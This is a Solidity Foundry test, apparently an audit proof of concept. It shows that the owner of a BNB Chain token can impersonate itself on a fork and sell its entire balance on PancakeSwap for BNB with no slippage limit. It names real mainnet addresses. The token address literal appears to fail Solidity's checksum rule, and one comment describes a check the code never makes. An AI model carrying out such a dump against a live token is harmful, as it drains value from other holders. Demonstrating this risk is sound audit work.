```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// ─── Interfaces ──────────────────────────────────────────────────────────────
interface IMaximumToken {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function owner() external view returns (address);
    function pair() external view returns (address);
    function router() external view returns (address);
    function checkFeeExempt(address) external view returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IPancakeRouter02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IWBNB {
    function balanceOf(address) external view returns (uint256);
}

// ─── Exploit PoC ─────────────────────────────────────────────────────────────
contract ExploitTest is Test {
    // mainnet addresses (BSC)
    IMaximumToken constant token   = IMaximumToken(0x5a3fe7eb5e43e69ef11275a4238c91a917ad42e5);
    IPancakeRouter02 constant router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant owner         = 0xd4ce9ECbd1Ac69e3DD96C5D2bd176D17C34E092a; // treasuryReceiver / contract owner

    IWBNB wbnb;
    address pair;

    function setUp() public virtual {
        vm.label(address(token), "MAXIMUM");
        vm.label(address(router), "PancakeRouter");
        vm.label(owner, "Owner");

        wbnb = IWBNB(router.WETH());
        vm.label(address(wbnb), "WBNB");

        pair = token.pair();
        vm.label(pair, "Pair");

        // Sanity: verify owner holds the entire initial supply
        assertEq(token.owner(), owner, "Owner mismatch");
        assertTrue(token.checkFeeExempt(owner), "Owner is not fee‑exempt");
    }

    // ─── Proof of Concept: Owner dumps all tokens for BNB profit ─────────────
    function testOwnerCanSellTokensForProfit() public {
        // 1. Pre‑state
        uint256 tokenBalanceBefore = token.balanceOf(owner);
        uint256 bnbBalanceBefore   = address(owner).balance;
        assertGt(tokenBalanceBefore, 0, "Owner has no tokens to sell");

        // 2. Owner approves the router to spend all tokens
        vm.prank(owner);
        token.approve(address(router), type(uint256).max);

        // 3. Swap all tokens for BNB via PancakeSwap
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(wbnb);

        vm.prank(owner);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalanceBefore,    // amountIn
            0,                     // amountOutMin (accept any)
            path,
            owner,                 // receive BNB
            block.timestamp
        );

        // 4. Post‑state
        uint256 tokenBalanceAfter = token.balanceOf(owner);
        uint256 bnbBalanceAfter   = address(owner).balance;

        // Owner must have offloaded its tokens and gained BNB
        assertLt(tokenBalanceAfter, tokenBalanceBefore, "Token balance did not decrease");
        assertGt(bnbBalanceAfter, bnbBalanceBefore, "BNB balance did not increase");

        // Ideally owner ends with zero tokens (no fees applied due to exemption)
        assertEq(tokenBalanceAfter, 0, "Owner still holds tokens after dumping");
    }
}
```
